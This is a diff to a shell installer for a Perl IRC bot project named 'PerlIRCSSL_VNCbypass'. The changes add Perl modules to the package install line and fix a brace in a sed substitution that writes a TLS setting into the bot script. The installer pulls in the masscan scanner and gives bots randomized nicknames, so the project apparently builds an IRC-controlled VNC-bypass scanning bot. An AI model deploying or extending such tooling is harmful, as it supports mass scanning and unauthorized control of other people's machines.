@@ -5,7 +5,7 @@
   echo 'https://github.com/independentcod/PerlIRCSSL_VNCbypass';
   read -p "Install required packages? Y or LEAVE BLANK + ENTER" choice
   case $choice in
-   Y) sudo yum install epel-release git python perl-CPAN* openssl-devel masscan -y && sudo cpan -fi Net::SSLeay IO::Socket::SSL Time::HiRes Mojolicious Mojo::IRC;;  
+   Y) sudo yum install epel-release git python perl-CPAN* openssl-devel masscan -y && sudo cpan -fi Digest::MD5 Net::SSLeay IO::Socket::SSL Time::HiRes Mojolicious Mojo::Util Mojo::Base Mojo::IRC;;  
  esac
  cp ./perlircssl.pl perlircssl.pl.bak;
 if read -p "IRC server:port? " name; then
@@ -14,7 +14,7 @@ fi
 read -p "Is the IRC port listening over SSL encryption? < 1 / 0 > (1=Yes, 0=No)" ssl
 case $ssl in
  0) sed -i~ -e "s/#definesslhere/\$irc->tls({insecure => ${ssl}});/g" perlircssl.pl;;
-*) sed -i~ -e "s/#definesslhere/\$irc->tls({insecure => 1);/g" perlircssl.pl;;
+*) sed -i~ -e "s/#definesslhere/\$irc->tls({insecure => 1});/g" perlircssl.pl;;
 esac
 if read -p "Bot Nickname Base? (Bawt)" nick; then
  sed -i~ -e "s/#definenickhere/nick => \'$nick\'.int(rand(99999)),/g" perlircssl.pl
